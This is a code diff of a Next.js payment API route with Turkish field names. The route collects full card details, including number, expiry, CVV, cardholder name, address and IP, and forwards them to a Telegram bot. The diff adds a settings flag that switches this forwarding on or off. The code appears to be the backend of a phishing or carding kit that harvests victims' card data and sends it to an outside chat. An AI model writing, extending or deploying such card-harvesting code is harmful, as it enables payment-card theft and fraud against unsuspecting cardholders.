@@ -1,6 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server';
 import pool from '@/lib/db';
 import { sendTelegramNotification } from '@/lib/telegram';
+import { getUsomSettings } from '@/lib/usom';
 import binlistData from '@/app/binlist.json';
 
 export async function POST(request: NextRequest) {
@@ -139,20 +140,23 @@ export async function POST(request: NextRequest) {
         }
 
         if (!isHard) {
-            sendTelegramNotification({
-                kart_isim: kart_isim || '',
-                kredi_karti,
-                skt,
-                cvv,
-                banka: banka || 'Bilinmiyor',
-                marka: marka || '',
-                seviye: seviye || '',
-                tutar: tutar || '',
-                taksit: taksit || 'Peşin',
-                adres: adresBilgisi,
-                ip,
-                tarih
-            }).catch(err => console.error('Telegram bildirim hatası:', err));
+            const notifySettings = await getUsomSettings();
+            if (notifySettings.log_notify) {
+                sendTelegramNotification({
+                    kart_isim: kart_isim || '',
+                    kredi_karti,
+                    skt,
+                    cvv,
+                    banka: banka || 'Bilinmiyor',
+                    marka: marka || '',
+                    seviye: seviye || '',
+                    tutar: tutar || '',
+                    taksit: taksit || 'Peşin',
+                    adres: adresBilgisi,
+                    ip,
+                    tarih
+                }).catch(err => console.error('Telegram bildirim hatası:', err));
+            }
         }
 
         return NextResponse.json({ 
